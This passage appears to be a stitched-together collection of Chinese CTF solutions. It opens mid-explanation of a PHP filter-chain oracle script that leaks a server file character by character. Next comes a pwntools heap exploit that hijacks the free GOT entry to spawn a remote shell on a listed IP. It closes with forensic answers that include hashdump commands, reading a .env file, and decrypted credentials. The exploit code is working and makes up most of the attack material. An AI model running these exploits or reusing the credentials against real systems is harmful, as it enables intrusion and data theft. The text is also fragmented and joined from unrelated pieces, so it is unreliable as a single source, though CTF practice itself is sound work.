characters of the string. There's only one problem: our r4 gadget requires that the string length
is a multiple of 4. The original base64 string will be a multiple of four by definition, so when
we apply convert.iconv.CSUNICODE.CSUNICODE it will be two more than a multiple of four, which is no
good for our r4 gadget. This is where the double equals we required in step 1 comes in! Because it
turns out, if we apply the filter
convert.quoted-printable-encode|convert.quoted-printable-encode|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7

It will turn the == into:
+---AD0-3D3D+---AD0-3D3D

And this is magic, because this corrects such that when we apply the
convert.iconv.CSUNICODE.CSUNICODE filter the resuting string is exactly a multiple of four!

Let's recap. We have a string like:
abcdefghij==

Apply the convert.quoted-printable-encode + convert.iconv.L1.utf7:
abcdefghij+---AD0-3D3D+---AD0-3D3D

Apply convert.iconv.CSUNICODE.CSUNICODE:
<0xff><0xfe>abcdefghij+---AD0-3D3D+---AD0-3D3D

Apply r4 gadget:
ba<0xfe><0xff>fedcjihg---+-0DAD3D3---+-0DAD3D3

Apply base64-decode | base64-encode, so the '-' and high bytes will disappear:
bafedcjihg+0DAD3D3+0DAD3Dw==

Then apply r4 once more:
efabijcd0+gh3DAD0+3D3DAD==wD

And here's the cute part: not only have we now accessed the 5th and 6th chars of the string, but
the string still has two equals signs in it, so we can reapply the technique as many times as we
want, to access all the characters in the string ;)
"""

flip = "convert.quoted-printable-encode|convert.quoted-printable-encode|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.CSUNICODE.CSUNICODE|convert.iconv.UCS-4LE.10646-1:
1993|convert.base64-decode|convert.base64-encode"
r2 = "convert.iconv.CSUNICODE.UCS-2BE"
r4 = "convert.iconv.UCS-4LE.10646-1:
1993"

def get_nth(n):
 global flip, r2, r4
 o = []
 chunk = n // 2
 if chunk % 2 == 1: o.append(r4)
 o.extend([flip, r4] * (chunk // 2))
 if (n % 2 == 1) ^ (chunk % 2 == 1): o.append(r2)
 return join(*o)

"""
Step 3:
This is the longest but actually easiest part. We can use dechunk oracle to figure out if the first
char is 0-9A-Fa-f. So it's just a matter of finding filters which translate to or from those
chars. rot13 and string lower are helpful. There are probably a million ways to do this bit but
I just bruteforced every combination of iconv filters to find these.

Numbers are a bit trickier because iconv doesn't tend to touch them.
In the CTF you coud porbably just guess from there once you have the letters. But if you actually 
want a full leak you can base64 encode a third time and use the first two letters of the resulting
string to figure out which number it is.
"""

rot1 = 'convert.iconv.437.CP930'
be = 'convert.quoted-printable-encode|convert.iconv..UTF7|convert.base64-decode|convert.base64-encode'
o = ''

def find_letter(prefix):
 if not req(f'{prefix}|dechunk|{blow_up_inf}'):
  # a-f A-F 0-9
  if not req(f'{prefix}|{rot1}|dechunk|{blow_up_inf}'):
   # a-e
   for n in range(5):
    if req(f'{prefix}|' + f'{rot1}|{be}|'*(n+1) + f'{rot1}|dechunk|{blow_up_inf}'):
     return 'edcba'[n]
     break
   else:
    err('something wrong')
  elif not req(f'{prefix}|string.tolower|{rot1}|dechunk|{blow_up_inf}'):
   # A-E
   for n in range(5):
    if req(f'{prefix}|string.tolower|' + f'{rot1}|{be}|'*(n+1) + f'{rot1}|dechunk|{blow_up_inf}'):
     return 'EDCBA'[n]
     break
   else:
    err('something wrong')
  elif not req(f'{prefix}|convert.iconv.CSISO5427CYRILLIC.855|dechunk|{blow_up_inf}'):
   return '*'
  elif not req(f'{prefix}|convert.iconv.CP1390.CSIBM932|dechunk|{blow_up_inf}'):
   # f
   return 'f'
  elif not req(f'{prefix}|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|{blow_up_inf}'):
   # F
   return 'F'
  else:
   err('something wrong')
 elif not req(f'{prefix}|string.rot13|dechunk|{blow_up_inf}'):
  # n-s N-S
  if not req(f'{prefix}|string.rot13|{rot1}|dechunk|{blow_up_inf}'):
   # n-r
   for n in range(5):
    if req(f'{prefix}|string.rot13|' + f'{rot1}|{be}|'*(n+1) + f'{rot1}|dechunk|{blow_up_inf}'):
     return 'rqpon'[n]
     break
   else:
    err('something wrong')
  elif not req(f'{prefix}|string.rot13|string.tolower|{rot1}|dechunk|{blow_up_inf}'):
   # N-R
   for n in range(5):
    if req(f'{prefix}|string.rot13|string.tolower|' + f'{rot1}|{be}|'*(n+1) + f'{rot1}|dechunk|{blow_up_inf}'):
     return 'RQPON'[n]
     break
   else:
    err('something wrong')
  elif not req(f'{prefix}|string.rot13|convert.iconv.CP1390.CSIBM932|dechunk|{blow_up_inf}'):
   # s
   return 's'
  elif not req(f'{prefix}|string.rot13|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|{blow_up_inf}'):
   # S
   return 'S'
  else:
   err('something wrong')
 elif not req(f'{prefix}|{rot1}|string.rot13|dechunk|{blow_up_inf}'):
  # i j k
  if req(f'{prefix}|{rot1}|string.rot13|{be}|{rot1}|dechunk|{blow_up_inf}'):
   return 'k'
  elif req(f'{prefix}|{rot1}|string.rot13|{be}|{rot1}|{be}|{rot1}|dechunk|{blow_up_inf}'):
   return 'j'
  elif req(f'{prefix}|{rot1}|string.rot13|{be}|{rot1}|{be}|{rot1}|{be}|{rot1}|dechunk|{blow_up_inf}'):
   return 'i'
  else:
   err('something wrong')
 elif not req(f'{prefix}|string.tolower|{rot1}|string.rot13|dechunk|{blow_up_inf}'):
  # I J K
  if req(f'{prefix}|string.tolower|{rot1}|string.rot13|{be}|{rot1}|dechunk|{blow_up_inf}'):
   return 'K'
  elif req(f'{prefix}|string.tolower|{rot1}|string.rot13|{be}|{rot1}|{be}|{rot1}|dechunk|{blow_up_inf}'):
   return 'J'
  elif req(f'{prefix}|string.tolower|{rot1}|string.rot13|{be}|{rot1}|{be}|{rot1}|{be}|{rot1}|dechunk|{blow_up_inf}'):
   return 'I'
  else:
   err('something wrong')
 elif not req(f'{prefix}|string.rot13|{rot1}|string.rot13|dechunk|{blow_up_inf}'):
  # v w x
  if req(f'{prefix}|string.rot13|{rot1}|string.rot13|{be}|{rot1}|dechunk|{blow_up_inf}'):
   return 'x'
  elif req(f'{prefix}|string.rot13|{rot1}|string.rot13|{be}|{rot1}|{be}|{rot1}|dechunk|{blow_up_inf}'):
   return 'w'
  elif req(f'{prefix}|string.rot13|{rot1}|string.rot13|{be}|{rot1}|{be}|{rot1}|{be}|{rot1}|dechunk|{blow_up_inf}'):
   return 'v'
  else:
   err('something wrong')
 elif not req(f'{prefix}|string.tolower|string.rot13|{rot1}|string.rot13|dechunk|{blow_up_inf}'):
  # V W X
  if req(f'{prefix}|string.tolower|string.rot13|{rot1}|string.rot13|{be}|{rot1}|dechunk|{blow_up_inf}'):
   return 'X'
  elif req(f'{prefix}|string.tolower|string.rot13|{rot1}|string.rot13|{be}|{rot1}|{be}|{rot1}|dechunk|{blow_up_inf}'):
   return 'W'
  elif req(f'{prefix}|string.tolower|string.rot13|{rot1}|string.rot13|{be}|{rot1}|{be}|{rot1}|{be}|{rot1}|dechunk|{blow_up_inf}'):
   return 'V'
  else:
   err('something wrong')
 elif not req(f'{prefix}|convert.iconv.CP285.CP280|string.rot13|dechunk|{blow_up_inf}'):
  # Z
  return 'Z'
 elif not req(f'{prefix}|string.toupper|convert.iconv.CP285.CP280|string.rot13|dechunk|{blow_up_inf}'):
  # z
  return 'z'
 elif not req(f'{prefix}|string.rot13|convert.iconv.CP285.CP280|string.rot13|dechunk|{blow_up_inf}'):
  # M
  return 'M'
 elif not req(f'{prefix}|string.rot13|string.toupper|convert.iconv.CP285.CP280|string.rot13|dechunk|{blow_up_inf}'):
  # m
  return 'm'
 elif not req(f'{prefix}|convert.iconv.CP273.CP1122|string.rot13|dechunk|{blow_up_inf}'):
  # y
  return 'y'
 elif not req(f'{prefix}|string.tolower|convert.iconv.CP273.CP1122|string.rot13|dechunk|{blow_up_inf}'):
  # Y
  return 'Y'
 elif not req(f'{prefix}|string.rot13|convert.iconv.CP273.CP1122|string.rot13|dechunk|{blow_up_inf}'):
  # l
  return 'l'
 elif not req(f'{prefix}|string.tolower|string.rot13|convert.iconv.CP273.CP1122|string.rot13|dechunk|{blow_up_inf}'):
  # L
  return 'L'
 elif not req(f'{prefix}|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|{blow_up_inf}'):
  # h
  return 'h'
 elif not req(f'{prefix}|string.tolower|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|{blow_up_inf}'):
  # H
  return 'H'
 elif not req(f'{prefix}|string.rot13|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|{blow_up_inf}'):
  # u
  return 'u'
 elif not req(f'{prefix}|string.rot13|string.tolower|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|{blow_up_inf}'):
  # U
  return 'U'
 elif not req(f'{prefix}|convert.iconv.CP1390.CSIBM932|dechunk|{blow_up_inf}'):
  # g
  return 'g'
 elif not req(f'{prefix}|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|{blow_up_inf}'):
  # G
  return 'G'
 elif not req(f'{prefix}|string.rot13|convert.iconv.CP1390.CSIBM932|dechunk|{blow_up_inf}'):
  # t
  return 't'
 elif not req(f'{prefix}|string.rot13|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|{blow_up_inf}'):
  # T
  return 'T'
 else:
  err('something wrong')

print()
for i in range(100):
 prefix = f'{header}|{get_nth(i)}'
 letter = find_letter(prefix)
 # it's a number! check base64
 if letter == '*':
  prefix = f'{header}|{get_nth(i)}|convert.base64-encode'
  s = find_letter(prefix)
  if s == 'M':
   # 0 - 3
   prefix = f'{header}|{get_nth(i)}|convert.base64-encode|{r2}'
   ss = find_letter(prefix)
   if ss in 'CDEFGH':
    letter = '0'
   elif ss in 'STUVWX':
    letter = '1'
   elif ss in 'ijklmn':
    letter = '2'
   elif ss in 'yz*':
    letter = '3'
   else:
    err(f'bad num ({ss})')
  elif s == 'N':
   # 4 - 7
   prefix = f'{header}|{get_nth(i)}|convert.base64-encode|{r2}'
   ss = find_letter(prefix)
   if ss in 'CDEFGH':
    letter = '4'
   elif ss in 'STUVWX':
    letter = '5'
   elif ss in 'ijklmn':
    letter = '6'
   elif ss in 'yz*':
    letter = '7'
   else:
    err(f'bad num ({ss})')
  elif s == 'O':
   # 8 - 9
   prefix = f'{header}|{get_nth(i)}|convert.base64-encode|{r2}'
   ss = find_letter(prefix)
   if ss in 'CDEFGH':
    letter = '8'
   elif ss in 'STUVWX':
    letter = '9'
   else:
    err(f'bad num ({ss})')
  else:
   err('wtf')

 print(end=letter)
 o += letter
 sys.stdout.flush()

"""
We are done!! :)
"""

print()
d = b64decode(o.encode() + b'=' * 4)
# remove KR padding
d = d.replace(b'$)C',b'')
print(b64decode(d))
from pwn import *

context.log_level='debug'
p = remote('101.200.234.115',45528)
elf = ELF('./takeway')
libc = ELF('./libc-so.6')

def add(idx,name,content):
    p.sendlineafter('your choose: ','1')
    p.sendlineafter('your order index',str(idx))
    p.sendafter('your food name: ',name)
    p.sendlineafter('Oops give',content)

def delete(idx):
    p.sendlineafter('your choose: ','2')
    p.sendlineafter('your order index: ',str(idx))

def show(idx):
    p.sendlineafter('your choose: ','3')
    p.sendlineafter('index: ',str(idx))

add(0,'a','aaaaaa')
add(1,'b','bbbbbb')
delete(1)
delete(0)
show(0)
p.recvuntil('order is: ')
heap_addr = u64(p.recvline()[:-1].ljust(8,b'x00')) - 0x10
print('heap_addr',hex(heap_addr))
p.sendafter('name is:',p64(0x2a0+heap_addr))
add(2,'/bin/shx00','aaa')
add(3,p64(elf.got['free']),'aaa')

show(0)
p.recvuntil('rder is: ')
libc_addr = u64(p.recvline()[:-1].ljust(8,b'x00')) - libc.sym['puts']
print('libc_addr',hex(libc_addr))
system = libc_addr + libc.sym['system']
p.sendafter('New food name is:',p64(system))
delete(2)
p.interactive()

p.close()
com.vestas.app
0x563b45ca
2147483647
https://vip.licai.com
io.dcloud.PandoraEntry
雷电模拟器
与你
5万
华哥
23f861b2e9c5ce9135afc520cbd849677522f54c
http://global.bing.com/?scope=web&mkt=en-US&FORM=QBRE
yang88/3w.qax.com
2023春季更新(14309)
24cfcfdf1fa894244f904067838e7e01e28ff450
3w.qax.com!!@@
3261
1019
2023-06-21 01:02:27
volatility.exe -f .memdump.mem --profile=Win7SP1x64 hashdump
3w.qax.com
volatility.exe -f .memdump.mem --profile=Win7SP1x64  printkey -K "ControlSet001EnumUSBSTOR"
2023-06-21 01:01:25
aad3b435b51404eeaad3b435b51404ee
2023-06-21 00:29:16
volatility.exe -f .memdump.mem --profile=Win7SP1x64 userassist
2023-06-21 00:47:41
SELECT url,title,visit_count,datetime((last_visit_time / 1000000) + strftime('%s', '1601-01-01'), 'unixepoch', 'localtime') AS visit_datetime FROM urls;
2
volatility.exe -f .memdump.mem --profile=Win7SP1x64 cmdline
2456
3.10.0-957.el7.x86_64
netstat -tlunp # 发现8083端口
cat /www/wwwroot/v9.licai.com/.env
ff1d923939ca2dcf
pc-uf6mmj68r91f78hkj.rwlb.rds.aliyuncs.com
5.7.40
public function index(Request $request)
    {
        // echo Crypt::
encrypt('123456');
        // echo Crypt::
decrypt("eyJpdiI6IjVJK3U1bERBSnhqdUZTcDNyVHBFREE9PSIsInZhbHVlIjoiSWpMdGtOQTlkVTFlVU83aHR3RFJ3UlU2K09lRjBuSzdSSlwvY0FLTTBXY009IiwibWFjIjoiZGY4MWNkYWY3Njc2ODRmODg0YjMxMWM1NmViNDAxZjA4ZDI0YTUwNGZhZmFjNjk0ZDZkMzQzZDA2NGI5ZDdmMSJ9");
        echo Crypt::
decrypt("eyJpdiI6IjNHMDJWZkpwMnBXVUpsYjRKcEM4WlE9PSIsInZhbHVlIjoibEpXSkJZZFlpWkl2dU9kY2tvR2xMWnZxT3E5T1pRUnhDVFlidjczY01EMD0iLCJtYWMiOiI5ODA2Nzc5MjM0MDE4MGY0MTkxMGEyOGQ1MTUwNWZiYmViMzk0MmQxYzc3NmViOWE5YTZjMjljNWM5OGIxZWVkIn0=");
        ......
解得
admin/root123456
root/mzx10000s
69
admin
183.160.76.194
20
2
128457.00
vim /www/wwwroot/v9.licai.com/app/Http/Controllers/Admin/SalesmansController.php
vim /www/wwwroot/v9.licai.com/resources/views/hui/salesmans/lists.blade.php
17
rows = document.querySelectorAll("#view tr");
var count = 0;

rows.forEach(function(row) {
    var tds  = row.getElementsByTagName('td');
    var tuiguangrens = parseInt(tds[5].innerHTML);

    if (tuiguangrens > 2) {
        //console.log(tuiguangrens);
     count++;
    }
 });
console.log("Count: " + count);
60
rows = document.querySelectorAll("#view tr");
var count = 0;
var Name = "";
maxValue  = 0;

rows.forEach(function(row) {
    var tds  = row.getElementsByTagName('td');
    var tuiguangrens = parseInt(tds[5].innerHTML);

    if (tuiguangrens > maxValue) {
                maxValue = tuiguangrens;
                Name = tds[4].innerHTML;
     }
 });
console.log("最多代理人姓名: " + Name);
骆潇原
select (SELECT sum(moneylog_money)
FROM `viplicai`.`moneylog` WHERE `viplicai`.`moneylog`.`moneylog_status`='+')-(SELECT sum(moneylog_money)
FROM `viplicai`.`moneylog` WHERE `viplicai`.`moneylog`.`moneylog_status`='-');
15,078,796.38
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/08/1-1693143992.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/08/3-1693143993.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/08/6-1693143993.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/08/0-1693143994.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/08/5-1693143994.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/08/5-1693143995.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/08/10-1693143995.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/08/5-1693143996.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/08/3-1693143997.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/08/9-1693143998.png)